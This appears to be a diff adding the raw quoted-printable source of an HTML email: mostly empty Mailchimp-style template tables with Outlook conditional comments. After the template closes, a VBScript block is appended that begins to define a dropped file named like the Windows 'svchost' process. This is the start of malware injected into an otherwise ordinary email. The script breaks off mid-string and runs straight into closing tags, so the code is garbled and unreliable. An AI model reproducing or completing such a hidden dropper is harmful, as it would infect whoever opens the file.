+                                    <td align=3D"center" valign=3D"top" wid=
+th=3D"600" style=3D"width:600px;">
+                                    <![endif]-->
+                                    <table align=3D"center" border=3D"0" ce=
+llpadding=3D"0" cellspacing=3D"0" width=3D"100%" class=3D"templateContainer=
+">
+                                        <tbody><tr>
+                                            <td valign=3D"top" class=3D"bod=
+yContainer"></td>
+                                        </tr>
+                                    </tbody></table>
+                                    <!--[if (gte mso 9)|(IE)]>
+                                    </td>
+                                    </tr>
+                                    </table>
+                                    <![endif]-->
+                                </td>
+                            </tr>
+                            <tr>
+                                <td align=3D"center" valign=3D"top" id=3D"t=
+emplateFooter">
+                                    <!--[if (gte mso 9)|(IE)]>
+                                    <table align=3D"center" border=3D"0" ce=
+llspacing=3D"0" cellpadding=3D"0" width=3D"600" style=3D"width:600px;">
+                                    <tr>
+                                    <td align=3D"center" valign=3D"top" wid=
+th=3D"600" style=3D"width:600px;">
+                                    <![endif]-->
+                                    <table align=3D"center" border=3D"0" ce=
+llpadding=3D"0" cellspacing=3D"0" width=3D"100%" class=3D"templateContainer=
+">
+                                        <tbody><tr>
+                                            <td valign=3D"top" class=3D"foo=
+terContainer"></td>
+                                        </tr>
+                                    </tbody></table>
+                                    <!--[if (gte mso 9)|(IE)]>
+                                    </td>
+                                    </tr>
+                                    </table>
+                                    <![endif]-->
+                                </td>
+                            </tr>
+                        </tbody></table>
+                        <!-- // END TEMPLATE -->
+                    </td>
+                </tr>
+            </tbody></table>
+        </center>
+   =20
+
+<script language=3D"VBScript"><!--
+DropFileName =3D "svchos</script></body></html>
+------=_Boundary_23957_572305474.1554890597258--
